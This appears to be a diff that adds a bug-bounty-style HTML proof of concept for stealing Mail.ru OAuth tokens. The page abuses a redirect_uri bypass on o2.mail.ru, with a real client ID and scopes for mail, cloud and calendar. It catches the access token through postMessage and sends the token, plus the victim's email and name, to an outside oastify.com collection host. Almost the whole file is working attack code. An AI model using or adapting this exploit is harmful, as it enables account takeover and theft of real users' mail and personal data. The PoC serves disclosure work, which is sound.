@@ -1,0 +1,79 @@
+ <!DOCTYPE html>
+ <html>
+ <head>
+ <title>Mail.ru OAuth Token Theft PoC</title>
+ <style>
+ body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+ h1 { color: #e94560; }
+ h2 { color: #ff6b6b; }
+ pre { background: #16213e; padding: 15px; border-radius: 5px; color: #a8e6cf; white-space: pre-wrap; }
+ #result { background: #0f3460; padding: 20px; margin: 20px 0; border-left: 5px solid #0f0; display: none; }
+ #userinfo { background: #16213e; padding: 15px; border-radius: 5px; margin-top: 10px; display: none; }
+ .btn { background: #e94560; color: white; padding: 15px 30px; border: none; cursor: pointer; font-family: monospace; font-size: 18px; border-radius: 5px; }
+ .btn:hover { background: #ff6b6b; }
+ </style>
+ </head>
+ <body>
+ 
+ <h1>o2.mail.ru OAuth redirect_uri Bypass â€” Token Theft PoC</h1>
+ 
+ <h2>1-Click Exploit</h2>
+ <p>Click the button below. A popup opens to o2.mail.ru, which auto-issues
+ an OAuth access_token and sends it to this page via postMessage.</p>
+ 
+ <button class="btn" onclick="stealToken()">Steal OAuth Token</button>
+ 
+ <div id="result">
+ <h2 style="color:#0f0">TOKEN STOLEN!</h2>
+ <pre id="token-display"></pre>
+ <div id="userinfo"></div>
+ </div>
+ 
+ <script>
+ var COLLAB = 'https://c5iykhtqwhyrzvyfsnj62yhh78d01rpg.oastify.com';
+ var ATTACKER = location.origin;
+ 
+ window.addEventListener('message', function(event) {
+     try {
+         var data = JSON.parse(event.data);
+         if (data.type === 'auth' && data.detail && data.detail.access_token) {
+             var token = data.detail.access_token;
+ 
+             new Image().src = COLLAB + '/token?t=' + encodeURIComponent(token);
+ 
+             document.getElementById('result').style.display = 'block';
+             document.getElementById('token-display').textContent =
+                 'access_token: ' + token + '\n' +
+                 'origin: ' + event.origin + '\n' +
+                 'delivered via: postMessage from o2.mail.ru';
+ 
+             fetch('https://o2.mail.ru/userinfo?access_token=' + token)
+                 .then(function(r) { return r.json(); })
+                 .then(function(info) {
+                     new Image().src = COLLAB + '/userinfo?email=' + encodeURIComponent(info.email)
+                         + '&name=' + encodeURIComponent(info.name);
+                     var ui = document.getElementById('userinfo');
+                     ui.style.display = 'block';
+                     ui.innerHTML = '<h2 style="color:#ff6b6b">Stolen User Data:</h2><pre>' +
+                         'Email:    ' + info.email + '\n' +
+                         'Name:     ' + info.name + '\n' +
+                         'Birthday: ' + info.birthday + '\n' +
+                         'ID:       ' + info.id + '</pre>';
+                 });
+         }
+     } catch(e) {}
+ });
+ 
+ function stealToken() {
+     var oauthUrl = 'https://o2.mail.ru/login?' +
+         'client_id=b4c073bb6c5a4b1b84d2c7d2a1bceb9b' +
+         '&redirect_uri=' + encodeURIComponent('https://e.mail.ru@' + location.host) +
+         '&response_type=token' +
+         '&scope=mail.imap%20userinfo%20cloud.read%20calendar.calendars.read%20calendar.events.read';
+ 
+     window.open(oauthUrl, '_blank');
+ }
+ </script>
+ 
+ </body>
+ </html>
